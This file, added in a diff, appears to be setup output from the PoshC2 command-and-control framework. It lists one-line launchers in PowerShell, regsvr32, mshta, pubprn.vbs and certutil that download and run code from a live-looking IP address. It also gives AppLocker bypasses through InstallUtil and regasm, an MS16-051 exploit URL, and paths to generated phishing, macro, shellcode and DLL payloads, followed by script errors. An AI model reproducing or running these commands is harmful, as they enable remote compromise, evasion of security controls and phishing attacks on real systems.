@@ -1,0 +1,85 @@
+To quickly get setup for internal pentesting, run:
+powershell -exec bypass -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('https://71.193.242.109:443/news/oyd13')"
+
+For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:
+regsvr32 /s /n /u /i:https://71.193.242.109:443/news/oyd13_rg scrobj.dll
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:https://71.193.242.109:443/news/oyd13_cs"
+mshta.exe vbscript:GetObject("script:https://71.193.242.109:443/news/oyd13_cs")(window.close)
+
+Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:
+mshta.exe vbscript:GetObject("script:https://71.193.242.109:443/news/oyd13_js")(window.close)
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:https://71.193.242.109:443/news/oyd13_js"
+
+To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U E:\HACKING\PoshC2-2018-19-04-0035\payloads\posh.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U E:\HACKING\PoshC2-2018-19-04-0035\payloads\posh.exe
+
+To exploit MS16-051 via IE9-11 use the following URL:
+https://71.193.242.109:443/news/oyd13_ms16-051
+
+To download PoshC2 InstallUtil/General executable use the following URL:
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:https://71.193.242.109:443/news/oyd13_df"
+certutil -urlcache -split -f https://71.193.242.109:443/news/oyd13_iu %temp%\\oyd13_iu
+
+For Red Teaming activities, use the following payloads:
+Batch Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Payload.bat
+StandAlone Exe written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh.exe
+HTA Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\index.html and Launcher.hta
+Macro Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\macro.txt
+Wscript Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\wscript.vbs
+MS16-051 payload, use this via a web server: E:\HACKING\PoshC2-2018-19-04-0035\payloads\ms16-051.html
+LNK Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\PhishingAttack-Link.lnk
+Service Exe written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\PoshService.exe
+Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads
+
+ReflectiveDLL and Shellcode that loads CLR v2.0.50727 - DLL Export (VoidFunc2)
+x86 DLL Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_v2_x86.dll
+x64 DLL Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_v2_x64.dll
+x86 Shellcode Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_v2-shellcode_x86.bin
+x64 Shellcode Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_v2-shellcode_x64.bin
+
+ReflectiveDLL and Shellcode that loads CLR v4.0.30319 - DLL Export (VoidFunc)
+x86 DLL Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_x86.dll
+x64 DLL Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh_x64.dll
+x86 Shellcode Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh-shellcode_x86.bin
+x64 Shellcode Written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\Posh-shellcode_x64.bin
+
+RunDLL Example:
+rundll32 Posh_x64.dll,VoidFunc
+
+DotNetToJS Created .js Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\posh.js
+Get-Content : Cannot find path 'E:\HACKING\PoshC2-2018-19-04-0035\payloads\posh.js' because it does not exist.
+At E:\HACKING\PoshC2\PowershellC2\C2-Payloads.ps1:373 char:15
++ $dotnettojs = Get-Content $global:newdir\payloads\posh.js | Out-Strin ...
++               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (E:\HACKING\Posh...ayloads\posh.js:String) [Get-Content], ItemNotFoundEx
+   ception
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+
+JS_SCT Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\js_sct.xml
+RG_SCT Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\rg_sct.xml
+CS_SCT Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\cs_sct.xml
+Get-Content : Cannot find path 'E:\HACKING\PoshC2-2018-19-04-0035\payloads\posh.exe' because it does not exist.
+At E:\HACKING\PoshC2\PowershellC2\C2-Payloads.ps1:193 char:42
++ ... se64String((Get-Content "$global:newdir\payloads\posh.exe" -encoding  ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (E:\HACKING\Posh...yloads\posh.exe:String) [Get-Content], ItemNotFoundEx
+   ception
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+
+Exception calling "ToBase64String" with "1" argument(s): "Value cannot be null.
+Parameter name: inArray"
+At E:\HACKING\PoshC2\PowershellC2\C2-Payloads.ps1:193 char:1
++ $payloadraw = [Convert]::ToBase64String((Get-Content "$global:newdir\ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentNullException
+
+DF_SCT Payload written to: E:\HACKING\PoshC2-2018-19-04-0035\payloads\df_sct.xml
+
+To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory:
+E:\HACKING\PoshC2-2018-19-04-0035
+
+
+
+
